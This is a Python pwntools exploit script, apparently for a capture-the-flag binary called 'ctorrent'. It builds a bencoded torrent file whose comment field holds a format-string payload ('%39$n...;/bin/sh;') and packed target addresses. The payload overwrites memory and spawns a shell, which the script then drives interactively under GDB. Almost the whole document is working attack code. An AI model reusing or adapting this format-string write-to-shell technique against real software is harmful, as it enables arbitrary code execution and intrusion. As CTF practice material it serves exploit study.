from pwn import *

def send_torr(size, content):
    io.sendlineafter(b"file >\n", b"%d" % size)
    io.sendlineafter(b"file >\n", content)

def encode(input):
    res = b""
    if isinstance(input, bytes):
        res += b"%d:%b" % (len(input), input)
    elif isinstance(input, int):
        res += b"i%be" % (str(input).encode("utf-8"))
    elif isinstance(input, list):
        res += b"l"
        for item in input:
            res += encode(item)
        res += b"e"
    elif isinstance(input, dict):
        res += b"d"
        for k, v in input.items():
            res += encode(k)
            res += encode(v)
        res += b"e"
    return res

# -- Exploit goes here --
if __name__ == "__main__":
    context.log_level = 'debug'  # 开启详细日志
    
    # 方法1A: 使用GDB附加
    io = process("./ctorrent")
    gdb.attach(io, '''
    # 在b_sprintf处设置断点
    break *0x410430
    # 在operator delete[]处设置断点  
    break *0x4024c0
    # 继续执行
    continue
    ''')
    
    data = encode({
        b"announce": b"http://test:80/announce",
        b"comment": b"%39$n%4203168c%38$n;/bin/sh;",
        b"info": {
            b"pieces": b"0" * 20,
            b"piece length": 0x14,
            b"name": b"test",
            b"length": 0x14,
        },
        b"abcd": b"" + p64(0x42E260) + p64(0x42E260 + 4)
    })
    
    print("[*] Sending payload of length:", len(data))
    send_torr(len(data), data)
    
    # 等待一下让GDB附加
    input("[*] Press Enter to continue after attaching GDB...")
    
    io.interactive()
    io.close()